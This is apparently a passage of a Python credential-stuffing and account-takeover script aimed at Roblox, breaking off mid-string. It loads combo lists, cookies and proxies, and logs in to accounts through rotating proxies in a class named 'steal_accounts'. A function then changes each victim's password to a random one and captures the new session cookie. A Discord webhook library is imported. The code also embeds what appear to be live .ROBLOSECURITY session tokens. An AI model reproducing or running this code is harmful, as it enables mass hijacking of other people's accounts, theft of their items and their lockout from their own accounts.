import httpx
import time,os
import tls_client
import random
import utils
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import string

from discord_webhook import DiscordWebhook
init()
cookies = open("cookies.txt").read().splitlines()
proxies_txt = open("proxies.txt").read().splitlines()

def generate_random_characters(num_characters):
    random_characters = ''.join(random.choices(string.ascii_letters + string.digits, k=num_characters))
    return random_characters
def change_password(client, xsrf, currentpassword, roblox_cookie):
    password = generate_random_characters(9)
    cookies = {
    'GuestData': 'UserID=-1560140213',
    '_gcl_au': '1.1.2056041812.1710616064',
    'RBXSource': 'rbx_acquisition_time=3/16/2024 2:07:44 PM&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Direct&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1',
    '__utmc': '200924205',
    '__utmz': '200924205.1710616081.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
    'RBXImageCache': 'timg=xSNtUABbWqhSdzA-h5_rw-hSUqNpPyM31rhTMtKON7I017V9lAzqYUt6BAL70PtV8z_EOionyc513T0s5hfwAQE6egWZhaTj286tC8z0LeNwURwoFqIdWKhUSu7ZxKvk9IJnheYRS9-XiVyet_bFNYp8Q6AhPWXltmlqevQSYf8wL3Ealyr6VNJSDjFkxfrHGvwsSV4vEEcFgOcdNsJ3dg',
    'rbx-ip2': '',
    '.ROBLOSECURITY': roblox_cookie,
    'rbxas': '9b741a7a85c21837cedd7db497330b9bf447b4ec6e0397930b4ae0af135c8d18',
    'RBXEventTrackerV2': 'CreateDate=3/19/2024 1:13:29 AM&rbxid=33263993&browserid=221161842499',
    'RBXSessionTracker': 'sessionid=f93d94b4-3f18-45f8-9f2c-3341ddeea813',
    '__utma': '200924205.1307649919.1710616081.1710812028.1710828810.11',
    '__utmb': '200924205.0.10.1710828810',
}
    headers = {
    'authority': 'auth.roblox.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': 'GuestData=UserID=-1560140213; _gcl_au=1.1.2056041812.1710616064; RBXSource=rbx_acquisition_time=3/16/2024 2:07:44 PM&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Direct&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1; __utmc=200924205; __utmz=200924205.1710616081.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); RBXImageCache=timg=xSNtUABbWqhSdzA-h5_rw-hSUqNpPyM31rhTMtKON7I017V9lAzqYUt6BAL70PtV8z_EOionyc513T0s5hfwAQE6egWZhaTj286tC8z0LeNwURwoFqIdWKhUSu7ZxKvk9IJnheYRS9-XiVyet_bFNYp8Q6AhPWXltmlqevQSYf8wL3Ealyr6VNJSDjFkxfrHGvwsSV4vEEcFgOcdNsJ3dg; rbx-ip2=; .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_376E248F75597BFF1C13749189675594A4F2D5508227D1FBB19A08BDFB0B66DE05FD979C58A1FD744CCAC6150E943639A14644D5ABBDA733E21541637F6F585D213A915C58F7C7F062F495324CC3CE04BE693E37A275C370C87DA3857E7DA718BB0A54CA92936DABDED61B00B90FA85006A1E955046C18E873B338EA17590259E8709B2C5E95F4FFB089AD5724E669C7D3DAA5D5A38440DB8F440264ABE989E21A5809C959706D2167E74A84B51BF58C8787BB84626AEA8A2FE2BA5791DCDF5358C52ABD5C44D6D31D895932D30B2C72A557144545188CC053086052BFD724503760AE26F48D9007FEEB43BDDBCA8D16A4168ADFCB0887415B3F2E01BBD67346548CAAE54F7EF57C73A7E2C9B5EE2E779F4C58D1EC437D1A0E2997E23398083A1BB893A39EB7424A80805352AA752FAF0AACFF9DB97008BC05BBA2163B822D72C249D64725EDC6103085663889DA873DEB501E70D5992ED22B61BF6C8D88422FD9685E84E68DA0F6A098AB06604E8B216FA5E4A048655755118624B3FD9AC0516FBB9E4EF4ECB5D9B5FAE860F076CA7230A75F3E6CC1AFC5D2BF1C37E9EB03C382D8DD40ACC8CFDCBB09FE07B696BF26B4A17F23DFCE30FC8F61C3BE4F6B86D64510A631AA54C3A8BE9F4FE373578B0C4E63E20953138A8C6F0715663D40BE94F4E9605FED143FB3740B6B07E769B43EE87A7CCEC066BE51CC57E2DFD97B8AFF2B5A0647EEF56A7976A893228D90CEB554C1AC1D0AE4F46CAE4CF917DD9E54CE839E403BC6AB16AF27C249E61D0ABE25E640D5658D032172A8E0F0F3D79AF833B66CE6816A82D8C1571E6EB3BCB0A88AE60A809CCCD23E6503B1D7C58D1761EFBF11180552A8CCFC309FB44313E82D49F091AD9799D275791C19F4C1D99523EB42BEC3AEA2687DF1E4E390D91D3305781319927AEC89D45C53D57E5C000990915D69CAF48B625A5771C375289F0DF4BC77B739965B39F81813274AC6B13F4C599569BA215575091C3022ECAB194DBDF6CEFE747E808059ADE0FE0941C7E73AC7DEF9B6B5DB8481414B1423776AC5D374D3D4039B; rbxas=9b741a7a85c21837cedd7db497330b9bf447b4ec6e0397930b4ae0af135c8d18; RBXEventTrackerV2=CreateDate=3/19/2024 1:13:29 AM&rbxid=33263993&browserid=221161842499; RBXSessionTracker=sessionid=f93d94b4-3f18-45f8-9f2c-3341ddeea813; __utma=200924205.1307649919.1710616081.1710812028.1710828810.11; __utmb=200924205.0.10.1710828810',
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com/',
    'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
}
    
    json_data = {
    'currentPassword': currentpassword,
    'newPassword': str(password),
    'secureAuthenticationIntent': {
        'clientPublicKey': 'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE04YllPSRfiEqgOBjzYzRx8HvEcUhBsSV87BMdRQcmhcBob5FoMEW9S6fBgpAdJwCjQElYj5qRkq97Z8lNLKGkA==',
        'clientEpochTimestamp': 1710828832,
        'serverNonce': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IlBHODIzV1ZRQ0dCUE1RWVQiLCJuYmYiOjE3MTA4Mjg4MzEsImV4cCI6MTcxMDgyOTEzMSwiaWF0IjoxNzEwODI4ODMxLCJpc3MiOiJoYmEtc2VydmljZSJ9.JomUmtpFMXSC3mi5pobFyqRuaSqsNb6MkK1_iDz3nhc',
        'saiSignature': 'qK+u9w1r8YQyhaxeLVQI3WJKuebHKVZrM/aK1pveILOfNSnCiVC7H2mKp/uEdo7v6xWt+xvJWwVCcFxOppmbig==',
    },
    }

    response = client.post(
        f'https://auth.roblox.com/v2/user/passwords/change',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    headers["x-csrf-token"] = response.headers.get("x-csrf-token")
    response = client.post(
        f'https://auth.roblox.com/v2/user/passwords/change',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    try:
        print(response.text)
        cookie = response.cookies.get(".ROBLOSECURITY")
        if response.status_code == 200:
            return [password, cookie]
        else:
            if response.status_code:
                return False
    except Exception as e:
        print(e)
        

class steal_accounts():
    def __init__(self, combo):
        try:
            proxy = random.choice(proxies_txt)
            self.client = httpx.Client(proxies={"http://": "http://"+proxy, "https://": "http://"+proxy}, timeout=10)
            #self.client = tls_client.Session(client_identifier="chrome122")
            self.cookie = random.choice(cookies)
            #self.client.proxies = f"http://{random.choice(proxies_txt)}"
            self.combo = combo.split(":")
            self.get_crsf()
        except Exception as e:
            print(e)
    def get_crsf(self):
        cookies = {
    'GuestData': 'UserID=-1560140213',
    '_gcl_au': '1.1.2056041812.1710616064',
    'RBXSource': 'rbx_acquisition_time=3/16/2024 2:07:44 PM&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Direct&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1',
    '__utmc': '200924205',
    '__utmz': '200924205.1710616081.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
    '.ROBLOSECURITY': '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_74C37F1B186BBAAE234FE4406CEC0CAA30A0222AF6C17070634846F879D3EA5847657B211A2214B74CBC8393CE1C963D17BAC23FD8E7762B062488DD4464AA585F057CED78C11B76CB9D75487DFCEF756203FBA03D68E84444659045CCFB80366D7ADE7BEFE9D1964F4D27140EF2F4BB7CAA34CC960BBC275E816174A4A182980B25E2EA57A01727798C547DDC936B2E032153063D29C03B83E9A3A75116A515D5845EF4691368265BC38176B40870BD9D736A10DAC3027AA1DE159D9291652B214E1F29D15FBDEA56D5072AECA6E453A998C069122EEC5AE2E98D644FE4C29BFA479021D1EAA2112AA9241BE40C2D5C5B7B765D7E3CD231D8A2CBC5CF23E76661A1B2997E3200170A59EF0F36B04D76FF4E32D824FB4631A11E2CEC36A1B1BD293B73BF84DA3BA4C5A02DA9CCCDA5344287DAD1D0F846FED1E517939250C5D5774A273A990603D05927013B096565141CE7B672EE6CCE9420FA2F37EFEA4AFF0633FC8A65EACE57867F2F1D85260A26A8B7CA1E25E7B13F6896138E2F375C4CFB7C0D21C02EA7693EEC1091F4DF351C4BB57917A88C67968A31B68088FEE34437FB12C17AB57FC98E2801114D630D64DDDCF16D3F4842DE84E01F4B9B1BF01C9CDC19094435BC0107A27C12CE200FDEFFD20E4DECA159D4A6EB0D8484B8F2E72B98D10C22BDFE6503EB48592B6CB0426C5A84F2B398E54AF52375102372C4308C00172C07A75C36151A07948FA968D2FC3E3F7CD5AF08724F5FE2532F6C4898754D19D1E5F8193C70881A41360EB8EC5BF833AE0E63F46D8B1A6897F5A177DD055D21E21A9357836173CB35B5EC2C3943BC6C78CA470AAC975832E492B82DC4BEA0A7F21A4761E5B171DDE0BDB32E24AE93F5D1E6B6DE3874E48A85B70F263388C6546B09974269D8C89577AB26DB9FD2218757E905181635675257668156E2E03066534E44A89A1ECF28DB1393117D34AB0A6FFE7258BEAD6316828AF40762FD57D4BA67EE4D0B32A611B3D0D63F2BCE93E767ABBF53F2BB3188D42992902F0D2A8102',
    'rbxas': '8ca11e92807d924e44a6c29901753eee1dc3658544365d0e3b3028ce0791f3b4',
    'RBXEventTrackerV2': 'CreateDate=3/17/2024 3:57:46 PM&rbxid=1466301285&browserid=221161842499',
    'rbx-ip2': '',
    'RBXSessionTracker': 'sessionid=4e82defb-44b6-4827-9228-cb9deadb721a',
    '__utma': '200924205.1307649919.1710616081.1710708983.1710791443.9',
    '__utmb': '200924205.0.10.1710791443',
}
        headers = {
            'authority': 'auth.roblox.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json;charset=UTF-8',
            # 'cookie': 'GuestData=UserID=-1742881970; _gcl_au=1.1.1197758974.1705882939; __utmz=200924205.1705882944.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); RBXSource=rbx_acquisition_time=2/21/2024 10:43:53 PM&rbx_acquisition_referrer=&rbx_medium=Direct&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1; rbx-ip2=; __utmc=200924205; RBXImageCache=timg=3eWto542tdlRWiRWqFCoVM4XmRf7lYON4yNcfNMnS8n8E-JPfFle7QA2Ss8a0i0LyqOWMhzc_h0QYz2KvpSdjgWq8iLdLGwXXVi5IyNwYDrZm94ESidpmipoOezi1tOupJRdYgABL9EbC3EnYkC03sEdwdJ8erQtTv7NphCt969HZ5mzYINxl8XsdTlxyLlh_TxlX-f105UZ2Eiq9X2TOQ; RBXEventTrackerV2=CreateDate=3/16/2024 12:55:58 PM&rbxid=55072916&browserid=215849086440; __utma=200924205.2019719194.1705882944.1710611448.1710615320.35; __utmb=200924205.0.10.1710615320',
            'origin': 'https://www.roblox.com',
            'referer': 'https://www.roblox.com/',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'x-bound-auth-token': 'BjgK++oH3Xqpm02Edezrj4/V64kNIfzZJz+JPoHHXBM=|1710791460|x8ONyPDpsNu+YyMO+CKgQLbPN7DUYoVSjHxg4wjHTgU17HFTIMyFsXVUP4q7XQ9cXJGAXuwqXgoE/G17EyPziA==',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        json_data = {
            "accountBlob": "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",
            'ctype': 'Username',
            'cvalue': self.combo[0],
            'password': self.combo[1],
            'secureAuthenticationIntent': {
                'clientPublicKey': 'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAErvV/jggyO+X2ZLbt6u54Kh6NsSvWJ6ISM6wYC/7/E4IQmOdP/XKdeqVigRcIgFhkHNp31JdibBZWf04zaWaiIA==',
                'clientEpochTimestamp': 1710615345,
                'serverNonce': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijg3UUc2WDM4TUI0M1FKWFIiLCJuYmYiOjE3MTA2MTUzNDQsImV4cCI6MTcxMDYxNTY0NCwiaWF0IjoxNzEwNjE1MzQ0LCJpc3MiOiJoYmEtc2VydmljZSJ9.4xy6oUv7imYAh6d6kAcDSAbSYcmxmdQH4QE6enGicZs',
                'saiSignature': 'kwF6NeWK5+KN/JzgsI3pr6TiaJJ4rqPg8HCwwZaDbB8jP1BDWDPpuNvHxIYAiRODkhbPVpPo2h1rCWG+t34Wvg==',
            },
        }

        response = self.client.post('https://auth.roblox.com/v2/login', headers=headers, json=json_data, cookies=cookies)
        print(response.text)
        self.csrf = response.headers.get('X-Csrf-Token')
        self.check_account()
        
    def check_account(self):
        cookies = {
    'GuestData': 'UserID=-1560140213',
    '_gcl_au': '1.1.2056041812.1710616064',
    'RBXSource': 'rbx_acquisition_time=3/16/2024 2:07:44 PM&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Direct&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1',
    '__utmc': '200924205',
    '__utmz': '200924205.1710616081.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
    '.ROBLOSECURITY': '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_74C37F1B186BBAAE234FE4406CEC0CAA30A0222AF6C17070634846F879D3EA5847657B211A2214B74CBC8393CE1C963D17BAC23FD8E7762B062488DD4464AA585F057CED78C11B76CB9D75487DFCEF756203FBA03D68E84444659045CCFB80366D7ADE7BEFE9D1964F4D27140EF2F4BB7CAA34CC960BBC275E816174A4A182980B25E2EA57A01727798C547DDC936B2E032153063D29C03B83E9A3A75116A515D5845EF4691368265BC38176B40870BD9D736A10DAC3027AA1DE159D9291652B214E1F29D15FBDEA56D5072AECA6E453A998C069122EEC5AE2E98D644FE4C29BFA479021D1EAA2112AA9241BE40C2D5C5B7B765D7E3CD231D8A2CBC5CF23E76661A1B2997E3200170A59EF0F36B04D76FF4E32D824FB4631A11E2CEC36A1B1BD293B73BF84DA3BA4C5A02DA9CCCDA5344287DAD1D0F846FED1E517939250C5D5774A273A990603D05927013B096565141CE7B672EE6CCE9420FA2F37EFEA4AFF0633FC8A65EACE57867F2F1D85260A26A8B7CA1E25E7B13F6896138E2F375C4CFB7C0D21C02EA7693EEC1091F4DF351C4BB57917A88C67968A31B68088FEE34437FB12C17AB57FC98E2801114D630D64DDDCF16D3F4842DE84E01F4B9B1BF01C9CDC19094435BC0107A27C12CE200FDEFFD20E4DECA159D4A6EB0D8484B8F2E72B98D10C22BDFE6503EB48592B6CB0426C5A84F2B398E54AF52375102372C4308C00172C07A75C36151A07948FA968D2FC3E3F7CD5AF08724F5FE2532F6C4898754D19D1E5F8193C70881A41360EB8EC5BF833AE0E63F46D8B1A6897F5A177DD055D21E21A9357836173CB35B5EC2C3943BC6C78CA470AAC975832E492B82DC4BEA0A7F21A4761E5B171DDE0BDB32E24AE93F5D1E6B6DE3874E48A85B70F263388C6546B09974269D8C89577AB26DB9FD2218757E905181635675257668156E2E03066534E44A89A1ECF28DB1393117D34AB0A6FFE7258BEAD6316828AF40762FD57D4BA67EE4D0B32A611B3D0D63F2BCE93E767ABBF53F2BB3188D42992902F0D2A8102',
    'rbxas': '8ca11e92807d924e44a6c29901753eee1dc3658544365d0e3b3028ce0791f3b4',
    'RBXEventTrackerV2': 'CreateDate=3/17/2024 3:57:46 PM&rbxid=1466301285&browserid=221161842499',
    'rbx-ip2': '',
    'RBXSessionTracker': 'sessionid=4e82defb-44b6-4827-9228-cb9deadb721a',
    '__utma': '200924205.1307649919.1710616081.1710708983.1710791443.9',
    '__utmb': '200924205.0.10.1710791443',
}
        headers = {
            'authority': 'auth.roblox.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json;charset=UTF-8',
            # 'cookie': 'GuestData=UserID=-1742881970; _gcl_au=1.1.1197758974.1705882939; __utmz=200924205.1705882944.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); RBXSource=rbx_acquisition_time=2/21/2024 10:43:53 PM&rbx_acquisition_referrer=&rbx_medium=Direct&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1; rbx-ip2=; __utmc=200924205; RBXImageCache=timg=3eWto542tdlRWiRWqFCoVM4XmRf7lYON4yNcfNMnS8n8E-JPfFle7QA2Ss8a0i0LyqOWMhzc_h0QYz2KvpSdjgWq8iLdLGwXXVi5IyNwYDrZm94ESidpmipoOezi1tOupJRdYgABL9EbC3EnYkC03sEdwdJ8erQtTv7NphCt969HZ5mzYINxl8XsdTlxyLlh_TxlX-f105UZ2Eiq9X2TOQ; RBXEventTrackerV2=CreateDate=3/16/2024 12:55:58 PM&rbxid=55072916&browserid=215849086440; __utma=200924205.2019719194.1705882944.1710611448.1710615320.35; __utmb=200924205.0.10.1710615320',
            'origin': 'https://www.roblox.com',
            'referer': 'https://www.roblox.com/',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'x-bound-auth-token': 'BjgK++oH3Xqpm02Edezrj4/V64kNIfzZJz+JPoHHXBM=|1710791460|x8ONyPDpsNu+YyMO+CKgQLbPN7DUYoVSjHxg4wjHTgU17HFTIMyFsXVUP4q7XQ9cXJGAXuwqXgoE/G17EyPziA==',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            "x-csrf-token": self.csrf
        }

        json_data = {
            "accountBlob": "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